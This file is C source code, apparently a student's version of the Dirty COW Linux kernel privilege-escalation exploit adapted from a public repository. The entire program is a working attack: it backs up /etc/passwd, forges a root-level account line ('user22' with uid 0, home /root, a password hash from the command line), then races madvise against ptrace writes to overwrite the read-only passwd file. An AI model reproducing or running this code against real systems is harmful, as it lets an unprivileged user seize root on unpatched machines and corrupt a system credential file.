// dirty cow
// alignment version
// implemented from https://github.com/firefart/dirtycow
// jaewon Heo

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <crypt.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <pthread.h>
#include <stdint.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>


const char* salt = "fsCfe"; // salt
const char* pw_file_loc = "/etc/passwd"; // original passwd file location
const char* pw_file_bk_loc = "/tmp/passwd.bak"; // backup location

int f; // file descriptor
void* map; // memory mapping variable
pid_t pid; // variable for storing child processor's pid
pthread_t pth; // variable for storing thread id for madvise() race
struct stat st; // to store password file's information


// this struct's size has to be divisible by 8
// since user_id, group_id = 0, both are char variables
struct user_info {
    char* username; 
    char* hash;
    char user_id;
    char group_id;
    char* info;
    char* home_dir;
    char* shell;
};

char* generate_password_hash(char* plain_pass) {
    return crypt(plain_pass, salt);
}

char* generate_password_line(struct user_info u) {
    char* format = "%s:%s:%d:%d:%s:%s:%s%s\n"; // with null paddings
    char* ret = NULL;
    char* paddings = NULL;
    int i;
    /*
    int size = snprintf(NULL,
                        0,
                        u.username,
                        u.hash,
                        u.user_id,
                        u.group_id,
                        u.info,
                        u.home_dir,
                        u.shell,
                        u.paddings);
    
    */

    // <username>:<hash>:<user_id>:<gid>:<info>:<home_dir>:<shell>\n<paddings>
    // user infos + 6 bytes colons + escape sequence + paddings -> divisible by 8
    // 6 colons + 2 ids + 1 escape sequence 
    unsigned int size = 9 + strlen(u.username) + strlen(u.hash) + strlen(u.info) + strlen(u.home_dir) + strlen(u.shell);
    unsigned int null_size = 0;

    for(i = 0; i < sizeof(long); i++) {
        if((size + i) % sizeof(long) == 0) {
            null_size = i;
            break;
        }
    }

    if(null_size > 0) {
        ret = (char*)malloc(size + (null_size));
        paddings = (char*)malloc(null_size);
        memset((void*)paddings, 0, null_size);

    }
    else {
        ret = (char*)malloc(size + sizeof(long));
        paddings = (char*)malloc(sizeof(long));
        memset((void*)paddings, 0, sizeof(long));
    }

    sprintf(ret,
            format,
            u.username,
            u.hash,
            u.user_id,
            u.group_id,
            u.info,
            u.home_dir,
            u.shell,
            paddings
            );

    return ret;
}

void* madvise_thread(void* arg) {
    int i; // iterator
    int c = 0; // error code counter
    for(i = 0; i < 20000000; i++) { // asking kernel to not using 100 bytes of map 20000000 times
        c += madvise(map, 100, MADV_DONTNEED); // MADV_DONTNEED call
    }

    fprintf(stdout, "madvise returned: %d\n", c); // shows summed error codes 
}


int copy_file() {

    // if backup file already exists, 
    if(access(pw_file_bk_loc, F_OK) != -1) {
        fprintf(stderr, "backup file already exists\n");
        return -1;
    }

    FILE* src;
    FILE* dest;
    char ch;
    src = fopen(pw_file_loc, "r");
    if(src == NULL) {
        fprintf(stderr, "cannot open password file\n");
        return -1;
    }

    dest = fopen(pw_file_bk_loc, "w");
    if(dest == NULL) {
        fprintf(stderr, "cannot create backup file\n");
        fclose(src);
        return -1;
    }

    while((ch = fgetc(src)) != EOF) {
        fputc(ch, dest);
    }

    fprintf(stdout, "successfully backed!\n");
    fclose(src);
    fclose(dest);

    return 0;
}

int main(int argc, char* argv[]) {
    
    if(argc != 2) {
        fprintf(stderr, "usage: ./dirty <password>");
        exit(1);
    }

    int ret = copy_file();
    if(ret != 0) {
        fprintf(stderr, "closing program\n");
        exit(ret);
    }
    else {
        struct user_info user;

        /* constructing user struct */
        user.username = "user22";
        user.hash = generate_password_hash(argv[1]); 
        user.user_id = 0;
        user.group_id = 0;
        user.info = "pawned";
        user.shell = "/bin/bash"; 
        user.home_dir = "/root";


        char* completed = generate_password_line(user);

        fprintf(stdout, "completed line: %s\n", completed);

        f = open(pw_file_loc, O_RDONLY);
        fstat(f, &st);

        map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);

        pid = fork();
        if(pid) {
            waitpid(pid, NULL, 0);
            int u, i, o, c = 0;
            int l = strlen(completed);
            for(i = 0; i < 10000/l; i++) 
            {
                for(o = 0; o < l; o+= sizeof(long)) {
                    for(u = 0; u < 10000; u++) {
                        c += ptrace(PTRACE_POKETEXT,
                                    pid,
                                    map + o,
                                    *((long*)(completed + o)));
                    }
                }
            }
        }
        
        else {
            // create thread for calling madavise()
           pthread_create(&pth,
                          NULL,
                          madvise_thread,
                          NULL);
            
            ptrace(PTRACE_TRACEME); // allowing parent process to write
            kill(getpid(), SIGSTOP); // stop process
            pthread_join(pth, NULL); // wait until madvise_thread function finishes
        }

    }

    close(f); // closing file descriptor
    return 0; // normal termination
    

}